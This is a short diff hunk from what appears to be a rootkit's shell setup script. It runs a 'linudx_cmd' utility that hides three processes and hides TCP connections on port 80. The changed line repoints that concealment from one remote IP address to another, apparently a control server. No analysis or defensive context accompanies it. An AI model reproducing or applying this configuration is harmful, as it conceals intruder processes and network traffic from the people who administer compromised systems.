@@ -119,5 +119,5 @@ fi
 /linudx/linudx_cmd hide $p1
 /linudx/linudx_cmd hide $p2
 /linudx/linudx_cmd hide $p3
-/linudx/linudx_cmd tcp 103.197.25.82 80 hide
+/linudx/linudx_cmd tcp 103.197.24.2 80 hide
 
